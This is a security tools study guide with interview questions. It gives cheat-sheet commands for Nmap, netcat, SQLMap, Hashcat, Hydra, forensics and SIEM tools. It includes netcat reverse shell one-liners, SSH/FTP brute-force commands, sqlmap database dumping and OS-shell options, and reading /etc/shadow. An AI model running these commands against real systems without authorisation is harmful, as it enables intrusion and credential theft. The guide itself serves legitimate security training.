# 🛠️ SECURITY TOOLS - Complete Guide

## Table of Contents
1. [Tool Categories](#tool-categories)
2. [Network Security Tools](#network-security-tools)
3. [Web Application Tools](#web-application-tools)
4. [Vulnerability Scanners](#vulnerability-scanners)
5. [Password & Credential Tools](#password--credential-tools)
6. [Forensics & Malware Analysis](#forensics--malware-analysis)
7. [SIEM & Monitoring](#siem--monitoring)
8. [Essential Linux Commands](#essential-linux-commands)
9. [Interview Questions](#interview-questions)
10. [Learning Resources](#learning-resources)

---

## Tool Categories

### Security Tool Landscape

```
┌─────────────────────────────────────────────────────────────┐
│               SECURITY TOOLS BY CATEGORY                     │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  🔍 RECONNAISSANCE                                          │
│     Nmap, Shodan, theHarvester, Maltego, Recon-ng          │
│                                                             │
│  🔒 VULNERABILITY SCANNING                                  │
│     Nessus, OpenVAS, Qualys, Nexpose                       │
│                                                             │
│  🌐 WEB APPLICATION                                         │
│     Burp Suite, OWASP ZAP, Nikto, SQLMap                   │
│                                                             │
│  💣 EXPLOITATION                                            │
│     Metasploit, Cobalt Strike, BeEF                        │
│                                                             │
│  🔑 PASSWORD CRACKING                                       │
│     Hashcat, John the Ripper, Hydra                        │
│                                                             │
│  📡 NETWORK ANALYSIS                                        │
│     Wireshark, tcpdump, NetworkMiner                       │
│                                                             │
│  🔬 FORENSICS                                               │
│     Autopsy, Volatility, FTK, Sleuth Kit                   │
│                                                             │
│  📊 SIEM & MONITORING                                       │
│     Splunk, ELK Stack, Wazuh, QRadar                       │
│                                                             │
│  🦠 MALWARE ANALYSIS                                        │
│     Ghidra, IDA Pro, Cuckoo, Any.Run                       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Network Security Tools

### Nmap - Network Mapper

```
┌─────────────────────────────────────────────────────────────┐
│                        NMAP                                  │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  PURPOSE: Network discovery and security auditing           │
│  WEBSITE: https://nmap.org/                                 │
│                                                             │
│  SCAN TYPES:                                                │
│  ┌──────────────┬──────────────────────────────────────┐   │
│  │ -sS          │ SYN scan (stealth, default)          │   │
│  │ -sT          │ TCP connect scan (noisy)             │   │
│  │ -sU          │ UDP scan                              │   │
│  │ -sV          │ Version detection                     │   │
│  │ -sC          │ Default scripts                       │   │
│  │ -O           │ OS detection                          │   │
│  │ -A           │ Aggressive (OS, version, scripts)    │   │
│  └──────────────┴──────────────────────────────────────┘   │
│                                                             │
│  PORT SPECIFICATION:                                        │
│  -p 80          # Single port                              │
│  -p 80,443      # Multiple ports                           │
│  -p 1-1000      # Port range                               │
│  -p-            # All 65535 ports                          │
│  --top-ports 100# Top 100 common ports                     │
│                                                             │
│  COMMON COMMANDS:                                           │
│  # Quick scan                                              │
│  nmap -T4 -F 192.168.1.0/24                               │
│                                                             │
│  # Comprehensive scan                                       │
│  nmap -sC -sV -O -p- -oA output 192.168.1.100             │
│                                                             │
│  # Vulnerability scan                                       │
│  nmap --script vuln 192.168.1.100                         │
│                                                             │
│  # Firewall evasion                                        │
│  nmap -f -T2 -D RND:5 192.168.1.100                       │
│                                                             │
│  NSE SCRIPTS (Nmap Scripting Engine):                       │
│  /usr/share/nmap/scripts/                                  │
│  --script smb-vuln*        # SMB vulnerabilities          │
│  --script http-*           # HTTP related                  │
│  --script vuln             # All vulnerability scripts     │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Wireshark - Packet Analyzer

```
┌─────────────────────────────────────────────────────────────┐
│                     WIRESHARK                                │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  PURPOSE: Network protocol analyzer (packet sniffer)        │
│  WEBSITE: https://www.wireshark.org/                        │
│                                                             │
│  COMMON FILTERS:                                            │
│  ┌──────────────────────────────────────────────────────┐  │
│  │ ip.addr == 192.168.1.1        # Specific IP         │  │
│  │ ip.src == 192.168.1.1         # Source IP           │  │
│  │ ip.dst == 192.168.1.1         # Destination IP      │  │
│  │ tcp.port == 80                # TCP port            │  │
│  │ http                          # HTTP traffic        │  │
│  │ dns                           # DNS queries         │  │
│  │ tcp.flags.syn == 1            # SYN packets         │  │
│  │ http.request.method == "POST" # HTTP POST           │  │
│  │ frame contains "password"     # Contains string     │  │
│  └──────────────────────────────────────────────────────┘  │
│                                                             │
│  CAPTURE FILTERS (during capture):                          │
│  host 192.168.1.1                                          │
│  port 80                                                   │
│  tcp port 443                                              │
│                                                             │
│  USEFUL FEATURES:                                           │
│  • Follow TCP Stream (reconstructs conversation)           │
│  • Export Objects (extract files from captures)            │
│  • Statistics → Protocol Hierarchy                         │
│  • Statistics → Conversations                              │
│                                                             │
│  USE CASES:                                                 │
│  • Troubleshooting network issues                          │
│  • Detecting suspicious traffic                            │
│  • Analyzing malware communication                         │
│  • Capturing credentials on unencrypted protocols          │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### tcpdump - Command Line Packet Capture

```
┌─────────────────────────────────────────────────────────────┐
│                      TCPDUMP                                 │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  PURPOSE: CLI network packet analyzer                       │
│                                                             │
│  BASIC USAGE:                                               │
│  tcpdump -i eth0                    # Capture on interface │
│  tcpdump -i eth0 -c 100             # Capture 100 packets  │
│  tcpdump -i eth0 -w capture.pcap    # Write to file        │
│  tcpdump -r capture.pcap            # Read from file       │
│                                                             │
│  FILTERS:                                                   │
│  tcpdump host 192.168.1.1                                  │
│  tcpdump src 192.168.1.1                                   │
│  tcpdump dst 192.168.1.1                                   │
│  tcpdump port 80                                           │
│  tcpdump tcp                                               │
│  tcpdump 'tcp[tcpflags] & tcp-syn != 0'  # SYN packets    │
│                                                             │
│  USEFUL OPTIONS:                                            │
│  -n           # Don't resolve hostnames                    │
│  -nn          # Don't resolve hostnames or ports           │
│  -X           # Show packet contents in hex and ASCII      │
│  -v/-vv/-vvv  # Verbose output                            │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Netcat - Network Swiss Army Knife

```
┌─────────────────────────────────────────────────────────────┐
│                      NETCAT (nc)                             │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  PURPOSE: Read/write data across network connections        │
│                                                             │
│  COMMON USES:                                               │
│                                                             │
│  # Port scanning                                           │
│  nc -zv 192.168.1.1 1-1000                                │
│                                                             │
│  # Banner grabbing                                         │
│  nc -v 192.168.1.1 80                                     │
│  HEAD / HTTP/1.1                                           │
│                                                             │
│  # Listen for connections (bind shell setup)               │
│  nc -lvnp 4444                                            │
│                                                             │
│  # Connect to listener                                     │
│  nc 192.168.1.100 4444                                    │
│                                                             │
│  # File transfer                                           │
│  nc -lvnp 4444 > received_file        # Receiver          │
│  nc 192.168.1.100 4444 < file_to_send # Sender            │
│                                                             │
│  # Reverse shell                                           │
│  nc -e /bin/bash 192.168.1.100 4444   # Linux             │
│  nc -e cmd.exe 192.168.1.100 4444     # Windows           │
│                                                             │
│  OPTIONS:                                                   │
│  -l  Listen mode                                           │
│  -v  Verbose                                               │
│  -n  Skip DNS resolution                                   │
│  -p  Port number                                           │
│  -e  Execute command after connection                      │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Web Application Tools

### Burp Suite

```
┌─────────────────────────────────────────────────────────────┐
│                    BURP SUITE                                │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  PURPOSE: Web application security testing                  │
│  WEBSITE: https://portswigger.net/burp                      │
│  VERSIONS: Community (free), Professional (paid)           │
│                                                             │
│  COMPONENTS:                                                │
│  ┌──────────────┬──────────────────────────────────────┐   │
│  │ Proxy        │ Intercept HTTP/HTTPS requests        │   │
│  │ Repeater     │ Manually modify and resend requests  │   │
│  │ Intruder     │ Automated attacks (brute force, fuzz)│   │
│  │ Scanner      │ Automated vulnerability scanning     │   │
│  │ Decoder      │ Encode/decode various formats        │   │
│  │ Comparer     │ Compare requests/responses           │   │
│  │ Sequencer    │ Analyze token randomness             │   │
│  │ Collaborator │ Out-of-band vulnerability detection  │   │
│  └──────────────┴──────────────────────────────────────┘   │
│                                                             │
│  SETUP:                                                     │
│  1. Configure browser proxy: 127.0.0.1:8080                │
│  2. Install Burp CA certificate in browser                 │
│  3. Turn intercept on/off as needed                        │
│                                                             │
│  INTRUDER ATTACK TYPES:                                     │
│  • Sniper: Single payload position                         │
│  • Battering Ram: Same payload all positions               │
│  • Pitchfork: Different payloads, parallel                 │
│  • Cluster Bomb: All payload combinations                  │
│                                                             │
│  USEFUL EXTENSIONS:                                         │
│  • Logger++, Autorize, Param Miner, JSON Beautifier        │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### OWASP ZAP

```
┌─────────────────────────────────────────────────────────────┐
│                    OWASP ZAP                                 │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  PURPOSE: Free web app security scanner                     │
│  WEBSITE: https://www.zaproxy.org/                          │
│                                                             │
│  FEATURES:                                                  │
│  • Automated scanner                                       │
│  • Intercepting proxy                                      │
│  • Spider/crawler                                          │
│  • Active and passive scanning                             │
│  • REST API for automation                                 │
│                                                             │
│  MODES:                                                     │
│  • Standard: Manual proxy + active scanning               │
│  • Attack: Aggressive automated testing                   │
│  • Safe: Passive scanning only                            │
│                                                             │
│  QUICK START:                                               │
│  1. Enter target URL                                       │
│  2. Spider the application                                 │
│  3. Run active scan                                        │
│  4. Review findings in Alerts tab                          │
│                                                             │
│  CLI USAGE:                                                 │
│  zap-cli quick-scan -s all http://target.com              │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### SQLMap

```
┌─────────────────────────────────────────────────────────────┐
│                       SQLMAP                                 │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  PURPOSE: Automated SQL injection exploitation              │
│  WEBSITE: https://sqlmap.org/                               │
│                                                             │
│  BASIC USAGE:                                               │
│  # Test URL parameter                                      │
│  sqlmap -u "http://target.com/page?id=1"                  │
│                                                             │
│  # Test POST data                                          │
│  sqlmap -u "http://target.com/login" --data="user=test"   │
│                                                             │
│  # Use request file (from Burp)                            │
│  sqlmap -r request.txt                                    │
│                                                             │
│  ENUMERATION:                                               │
│  --dbs                 # List databases                    │
│  -D dbname --tables    # List tables                       │
│  -D dbname -T users --columns    # List columns            │
│  -D dbname -T users --dump       # Dump data               │
│                                                             │
│  USEFUL OPTIONS:                                            │
│  --batch              # Non-interactive                    │
│  --level=5            # More thorough testing              │
│  --risk=3             # More aggressive tests              │
│  --os-shell           # Get OS shell                       │
│  --sql-shell          # Get SQL shell                      │
│  --tamper=space2comment  # Evasion techniques             │
│                                                             │
│  EXAMPLE:                                                   │
│  sqlmap -u "http://target.com/page?id=1" --dbs --batch    │
│  sqlmap -u "http://target.com/page?id=1" -D testdb \      │
│         -T users --dump                                    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Gobuster / Dirb / Ffuf

```
┌─────────────────────────────────────────────────────────────┐
│              DIRECTORY BRUTE FORCING                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  GOBUSTER:                                                  │
│  # Directory brute force                                   │
│  gobuster dir -u http://target.com -w /path/to/wordlist   │
│                                                             │
│  # With extensions                                         │
│  gobuster dir -u http://target.com -w wordlist \          │
│           -x php,html,txt                                  │
│                                                             │
│  # DNS subdomain brute force                               │
│  gobuster dns -d target.com -w wordlist                   │
│                                                             │
│  # Virtual host brute force                                │
│  gobuster vhost -u http://target.com -w wordlist          │
│                                                             │
│  ───────────────────────────────────────────────────────   │
│                                                             │
│  FFUF (faster):                                             │
│  ffuf -u http://target.com/FUZZ -w wordlist               │
│  ffuf -u http://target.com/FUZZ -w wordlist -mc 200,301   │
│  ffuf -u http://target.com/FUZZ -w wordlist -fc 404       │
│                                                             │
│  ───────────────────────────────────────────────────────   │
│                                                             │
│  POPULAR WORDLISTS:                                         │
│  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
│  /usr/share/wordlists/dirb/common.txt                      │
│  /usr/share/seclists/Discovery/Web-Content/              │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Vulnerability Scanners

### Nessus

```
┌─────────────────────────────────────────────────────────────┐
│                       NESSUS                                 │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  PURPOSE: Most widely-used vulnerability scanner            │
│  VENDOR: Tenable                                           │
│  VERSIONS: Essentials (free, limited), Pro (commercial)    │
│                                                             │
│  CAPABILITIES:                                              │
│  ├── Network vulnerability scanning                        │
│  ├── Configuration auditing                                │
│  ├── Malware detection                                     │
│  ├── Compliance checking (PCI, HIPAA)                      │
│  └── Web application scanning                              │
│                                                             │
│  SCAN TYPES:                                                │
│  • Basic Network Scan                                      │
│  • Advanced Scan                                           │
│  • Web Application Tests                                   │
│  • Credentialed Scan (with login credentials)             │
│  • Compliance Audit                                        │
│                                                             │
│  OUTPUT:                                                    │
│  • CVSS scores                                             │
│  • CVE references                                          │
│  • Remediation steps                                       │
│  • Export: PDF, CSV, HTML, XML                            │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### OpenVAS (GVM)

```
┌─────────────────────────────────────────────────────────────┐
│                    OPENVAS / GVM                             │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  PURPOSE: Free, open-source vulnerability scanner          │
│  WEBSITE: https://www.greenbone.net/en/community-edition/  │
│                                                             │
│  COMPONENTS:                                                │
│  • Greenbone Vulnerability Manager (GVM)                   │
│  • OpenVAS Scanner                                         │
│  • Greenbone Security Assistant (Web UI)                   │
│                                                             │
│  INSTALLATION (Kali):                                       │
│  sudo apt install openvas                                  │
│  sudo gvm-setup                                            │
│  sudo gvm-start                                            │
│  # Access: https://localhost:9392                          │
│                                                             │
│  WORKFLOW:                                                  │
│  1. Create target (IP/hostname)                            │
│  2. Create task (assign scan config)                       │
│  3. Run scan                                               │
│  4. Review reports                                         │
│                                                             │
│  COMPARISON WITH NESSUS:                                    │
│  ✅ Free and open-source                                   │
│  ✅ Good vulnerability coverage                            │
│  ❌ Slower than Nessus                                     │
│  ❌ Less polished interface                                │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Password & Credential Tools

### Hashcat

```
┌─────────────────────────────────────────────────────────────┐
│                      HASHCAT                                 │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  PURPOSE: Advanced password recovery (GPU-based)            │
│  WEBSITE: https://hashcat.net/hashcat/                      │
│                                                             │
│  ATTACK MODES:                                              │
│  -a 0  Dictionary attack                                   │
│  -a 1  Combinator (word1 + word2)                         │
│  -a 3  Brute-force/mask attack                            │
│  -a 6  Hybrid: wordlist + mask                            │
│  -a 7  Hybrid: mask + wordlist                            │
│                                                             │
│  HASH MODES (examples):                                     │
│  -m 0     MD5                                              │
│  -m 100   SHA-1                                            │
│  -m 1400  SHA-256                                          │
│  -m 1000  NTLM (Windows)                                   │
│  -m 3200  bcrypt                                           │
│  -m 1800  SHA-512 (Unix)                                   │
│                                                             │
│  EXAMPLES:                                                  │
│  # Dictionary attack on MD5                                │
│  hashcat -m 0 -a 0 hashes.txt wordlist.txt                │
│                                                             │
│  # Brute force 8-char lowercase                            │
│  hashcat -m 0 -a 3 hashes.txt ?l?l?l?l?l?l?l?l            │
│                                                             │
│  # With rules                                              │
│  hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules.rule  │
│                                                             │
│  MASK CHARACTERS:                                           │
│  ?l = lowercase  ?u = uppercase  ?d = digit               │
│  ?s = special    ?a = all        ?b = binary              │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### John the Ripper

```
┌─────────────────────────────────────────────────────────────┐
│                  JOHN THE RIPPER                             │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  PURPOSE: Password cracker (CPU-based, versatile)          │
│  WEBSITE: https://www.openwall.com/john/                    │
│                                                             │
│  BASIC USAGE:                                               │
│  john hashes.txt                    # Auto-detect format   │
│  john --wordlist=words.txt hashes.txt                     │
│  john --show hashes.txt             # Show cracked         │
│                                                             │
│  FORMAT SPECIFICATION:                                      │
│  john --format=raw-md5 hashes.txt                         │
│  john --format=raw-sha256 hashes.txt                      │
│  john --format=NT hashes.txt        # Windows NTLM        │
│  john --list=formats                # List all formats    │
│                                                             │
│  HASH EXTRACTION:                                           │
│  unshadow /etc/passwd /etc/shadow > unshadowed.txt        │
│  zip2john file.zip > zip_hash.txt                         │
│  ssh2john id_rsa > ssh_hash.txt                           │
│  keepass2john database.kdbx > keepass_hash.txt            │
│                                                             │
│  RULES & MODES:                                             │
│  john --rules hashes.txt            # Apply rules          │
│  john --incremental hashes.txt      # Brute force          │
│  john --single hashes.txt           # Use username info   │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Hydra

```
┌─────────────────────────────────────────────────────────────┐
│                       HYDRA                                  │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  PURPOSE: Online password brute forcing                     │
│  WEBSITE: https://github.com/vanhauser-thc/thc-hydra       │
│                                                             │
│  SUPPORTED PROTOCOLS:                                       │
│  SSH, FTP, HTTP, HTTPS, SMB, MySQL, PostgreSQL, RDP,       │
│  Telnet, SMTP, POP3, IMAP, VNC, and 50+ more               │
│                                                             │
│  BASIC SYNTAX:                                              │
│  hydra -l <user> -P <password_list> <target> <protocol>   │
│  hydra -L <user_list> -p <password> <target> <protocol>   │
│  hydra -L <users> -P <passwords> <target> <protocol>      │
│                                                             │
│  EXAMPLES:                                                  │
│  # SSH brute force                                         │
│  hydra -l admin -P passwords.txt ssh://192.168.1.100      │
│                                                             │
│  # FTP brute force                                         │
│  hydra -L users.txt -P pass.txt ftp://192.168.1.100       │
│                                                             │
│  # HTTP POST form                                          │
│  hydra -l admin -P passwords.txt 192.168.1.100 \          │
│        http-post-form \                                    │
│        "/login:user=^USER^&pass=^PASS^:F=incorrect"       │
│                                                             │
│  OPTIONS:                                                   │
│  -t <n>     Number of threads (default 16)                │
│  -V         Verbose (show each attempt)                   │
│  -f         Exit after first found                        │
│  -s <port>  Custom port                                   │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Forensics & Malware Analysis

### Volatility (Memory Analysis)

```
┌─────────────────────────────────────────────────────────────┐
│                     VOLATILITY                               │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  PURPOSE: Memory forensics framework                        │
│  WEBSITE: https://www.volatilityfoundation.org/            │
│                                                             │
│  VOLATILITY 3 USAGE:                                        │
│  vol -f memory.dmp windows.info           # System info    │
│  vol -f memory.dmp windows.pslist         # Process list   │
│  vol -f memory.dmp windows.pstree         # Process tree   │
│  vol -f memory.dmp windows.cmdline        # Command lines  │
│  vol -f memory.dmp windows.netscan        # Network conns  │
│  vol -f memory.dmp windows.filescan       # Open files     │
│  vol -f memory.dmp windows.hashdump       # Password hashes│
│  vol -f memory.dmp windows.malfind        # Injected code  │
│                                                             │
│  VOLATILITY 2 (legacy):                                     │
│  vol.py -f memory.dmp imageinfo                            │
│  vol.py -f memory.dmp --profile=Win7SP1x64 pslist         │
│                                                             │
│  COMMON ANALYSIS WORKFLOW:                                  │
│  1. Identify system (imageinfo/windows.info)               │
│  2. List processes (pslist/pstree)                         │
│  3. Check network connections (netscan)                    │
│  4. Look for injection (malfind)                           │
│  5. Extract suspicious files (filescan + dumpfiles)        │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Autopsy / The Sleuth Kit

```
┌─────────────────────────────────────────────────────────────┐
│                 AUTOPSY / SLEUTH KIT                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  PURPOSE: Digital forensics platform                        │
│  WEBSITE: https://www.autopsy.com/                          │
│                                                             │
│  CAPABILITIES:                                              │
│  • Disk image analysis                                     │
│  • File system analysis                                    │
│  • Timeline generation                                     │
│  • Keyword search                                          │
│  • Hash lookup                                             │
│  • Web artifact analysis                                   │
│  • Email analysis                                          │
│  • Registry analysis (Windows)                             │
│  • Deleted file recovery                                   │
│                                                             │
│  SLEUTH KIT COMMANDS:                                       │
│  mmls image.dd              # List partitions              │
│  fls -r image.dd            # List files                   │
│  icat image.dd 12345        # Extract file by inode        │
│  tsk_recover image.dd /output  # Recover deleted files    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Ghidra (Reverse Engineering)

```
┌─────────────────────────────────────────────────────────────┐
│                       GHIDRA                                 │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  PURPOSE: NSA's software reverse engineering tool           │
│  WEBSITE: https://ghidra-sre.org/                           │
│                                                             │
│  FEATURES:                                                  │
│  • Disassembler                                            │
│  • Decompiler (generates C-like code)                      │
│  • Debugger                                                │
│  • Scripting (Python, Java)                                │
│  • Multi-platform support                                  │
│  • Collaborative analysis                                  │
│                                                             │
│  WORKFLOW:                                                  │
│  1. Create new project                                     │
│  2. Import binary                                          │
│  3. Auto-analyze                                           │
│  4. Navigate functions, strings, imports                   │
│  5. Use decompiler for high-level view                     │
│                                                             │
│  ALTERNATIVE: IDA Pro (commercial, industry standard)      │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## SIEM & Monitoring

### Splunk

```
┌─────────────────────────────────────────────────────────────┐
│                       SPLUNK                                 │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  PURPOSE: Log management, SIEM, data analysis               │
│  WEBSITE: https://www.splunk.com/                           │
│                                                             │
│  SPL (Search Processing Language):                          │
│                                                             │
│  # Basic search                                            │
│  index=main source="auth.log"                              │
│                                                             │
│  # Filter by keyword                                       │
│  index=main "failed login" | stats count by user          │
│                                                             │
│  # Time range                                              │
│  index=main earliest=-24h latest=now                       │
│                                                             │
│  # Common commands                                          │
│  | stats count                   # Count events            │
│  | table field1, field2         # Show specific fields    │
│  | sort -count                  # Sort descending         │
│  | top 10 user                  # Top 10 values           │
│  | timechart count              # Time-based chart        │
│  | where count > 100            # Filter results          │
│                                                             │
│  USE CASES:                                                 │
│  • Security monitoring (SOC)                               │
│  • Incident investigation                                  │
│  • Compliance reporting                                    │
│  • Application monitoring                                  │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### ELK Stack (Elastic)

```
┌─────────────────────────────────────────────────────────────┐
│                    ELK STACK                                 │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  COMPONENTS:                                                │
│  ┌──────────────┬──────────────────────────────────────┐   │
│  │ Elasticsearch│ Search and analytics engine          │   │
│  │ Logstash     │ Log collection and processing        │   │
│  │ Kibana       │ Visualization and dashboards         │   │
│  │ (Beats)      │ Lightweight data shippers            │   │
│  └──────────────┴──────────────────────────────────────┘   │
│                                                             │
│  DATA FLOW:                                                 │
│  Beats → Logstash → Elasticsearch → Kibana                 │
│                                                             │
│  BEATS TYPES:                                               │
│  • Filebeat (logs)                                         │
│  • Metricbeat (system metrics)                             │
│  • Packetbeat (network)                                    │
│  • Winlogbeat (Windows events)                             │
│  • Auditbeat (audit data)                                  │
│                                                             │
│  KIBANA FEATURES:                                           │
│  • Discover (search logs)                                  │
│  • Visualize (create charts)                               │
│  • Dashboard (combine visualizations)                      │
│  • Security (SIEM features)                                │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Essential Linux Commands

### Security-Related Commands

```
┌─────────────────────────────────────────────────────────────┐
│             LINUX SECURITY COMMANDS                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  FILE PERMISSIONS:                                          │
│  ls -la                    # List with permissions         │
│  chmod 755 file            # Change permissions            │
│  chown user:group file     # Change ownership              │
│  find / -perm -4000        # Find SUID files               │
│                                                             │
│  USER & GROUPS:                                             │
│  whoami                    # Current user                  │
│  id                        # User and group IDs            │
│  cat /etc/passwd           # User accounts                 │
│  cat /etc/shadow           # Password hashes (root)        │
│  cat /etc/group            # Groups                        │
│                                                             │
│  NETWORK:                                                   │
│  ifconfig / ip addr        # Network interfaces            │
│  netstat -tulpn            # Listening ports               │
│  ss -tulpn                 # Socket statistics             │
│  iptables -L               # Firewall rules                │
│                                                             │
│  PROCESSES:                                                 │
│  ps aux                    # All processes                 │
│  top / htop                # Process monitor               │
│  lsof -i                   # Network connections           │
│                                                             │
│  LOGS:                                                      │
│  tail -f /var/log/syslog   # System log                   │
│  tail -f /var/log/auth.log # Authentication log           │
│  journalctl -xe            # Systemd logs                  │
│                                                             │
│  SEARCHING:                                                 │
│  grep -r "password" /      # Search in files               │
│  find / -name "*.conf"     # Find files                    │
│  locate filename           # Fast file search              │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Interview Questions

### Basic Questions

**Q1: What is Nmap and what are some common scan types?**
> "Nmap is a network exploration and security auditing tool. Common scans include: SYN scan (-sS) which is stealthy and doesn't complete TCP handshake, TCP connect scan (-sT) which completes full connection, UDP scan (-sU) for UDP services, and version detection (-sV) which identifies service versions. A comprehensive scan would be 'nmap -sC -sV -O -p- target'."

**Q2: How does Wireshark help in security analysis?**
> "Wireshark is a network protocol analyzer that captures and analyzes network traffic. In security, it's used to detect suspicious traffic patterns, analyze malware communication, capture credentials on unencrypted protocols, investigate incidents, and troubleshoot network issues. Key features include display filters, following TCP streams, and exporting captured objects."

**Q3: What's the difference between Hashcat and John the Ripper?**
> "Hashcat primarily uses GPU for password cracking, making it extremely fast for raw hashing. John the Ripper is more versatile, CPU-based, and excels at format detection and has many hash extractors (zip2john, ssh2john). John is better for quick offline attacks and variety; Hashcat is better when you need maximum speed with GPU power."

### Advanced Questions

**Q4: Explain how you would use Burp Suite to test for SQL injection.**
> "First, configure browser to use Burp as proxy. Browse the application while Burp captures requests. Send interesting requests (with parameters) to Repeater. Modify parameters with SQL payloads (single quote, OR 1=1, etc.) and observe responses in Repeater. Look for error messages, different response lengths, or behavior changes. For automated testing, use Intruder with SQL injection payloads. Finally, if vulnerable, use SQLMap with the captured request for exploitation."

**Q5: How would you use a SIEM like Splunk for threat hunting?**
> "I would start by establishing baselines of normal behavior. Then search for anomalies: unusual login times, failed authentication spikes, new services/processes, suspicious network connections to rare destinations, or large data transfers. I'd create dashboards for key indicators, use the 'stats' and 'timechart' commands to identify patterns, correlate events across multiple log sources, and set up alerts for known IOCs or suspicious patterns."

---

## Learning Resources

### 📚 Websites

| Website | Link | What You'll Learn |
|---------|------|-------------------|
| **Tool Documentation** | Various | Official guides |
| **SANS Reading Room** | https://www.sans.org/reading-room/ | Tool usage papers |
| **PentesterLab** | https://pentesterlab.com/ | Tool practice |
| **HackTricks** | https://book.hacktricks.xyz/ | Cheat sheets |
| **Kali Tools** | https://www.kali.org/tools/ | Tool listings |

### 🎥 YouTube Videos

| Video | Link | Topic |
|-------|------|-------|
| **Nmap Tutorial** | https://www.youtube.com/watch?v=4t4kBkMsDbQ | Network scanning |
| **Burp Suite For Beginners** | https://www.youtube.com/watch?v=h2duGBZLEek | Web testing |
| **Wireshark Tutorial** | https://www.youtube.com/watch?v=lb1Dw0elw0Q | Packet analysis |
| **Hashcat Tutorial** | https://www.youtube.com/watch?v=z4_oqTZJqCo | Password cracking |
| **Splunk Tutorial** | https://www.youtube.com/watch?v=xtyH_6iMxwA | SIEM |

### 📖 Courses

| Course | Platform | Link |
|--------|----------|------|
| **Practical Ethical Hacking** | TCM Security | https://academy.tcm-sec.com/ |
| **Splunk Fundamentals** | Splunk | https://www.splunk.com/en_us/training.html |
| **SANS SEC504** | SANS | https://www.sans.org/cyber-security-courses/hacker-techniques-incident-handling/ |
| **Blue Team Level 1** | Security Blue Team | https://securityblue.team/ |

---

## Quick Reference Card

```
┌─────────────────────────────────────────────────────────────┐
│            SECURITY TOOLS QUICK REFERENCE                    │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  SCANNING:                                                  │
│  nmap -sC -sV -p- target       # Comprehensive scan        │
│  nmap --script vuln target     # Vulnerability scan        │
│                                                             │
│  WEB TESTING:                                               │
│  Burp Suite: Proxy, Repeater, Intruder                     │
│  gobuster dir -u URL -w wordlist                           │
│  sqlmap -u "URL?id=1" --dbs                                │
│                                                             │
│  PASSWORD CRACKING:                                         │
│  hashcat -m 0 -a 0 hashes.txt wordlist.txt                │
│  john --wordlist=wordlist hashes.txt                       │
│  hydra -l user -P passlist ssh://target                    │
│                                                             │
│  NETWORK ANALYSIS:                                          │
│  wireshark (GUI) / tcpdump -i eth0 (CLI)                  │
│  nc -lvnp 4444 (listen) / nc IP PORT (connect)            │
│                                                             │
│  VULN SCANNING:                                             │
│  Nessus (commercial) / OpenVAS (free)                      │
│                                                             │
│  FORENSICS:                                                 │
│  vol -f dump.mem windows.pslist                            │
│  autopsy (disk forensics)                                  │
│                                                             │
│  SIEM:                                                      │
│  Splunk: index=main | stats count by src_ip               │
│  ELK: Elasticsearch + Logstash + Kibana                   │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

*Next Topic: [System Design Security](../08_System_Design_Security/01_Secure_Architecture.md)*
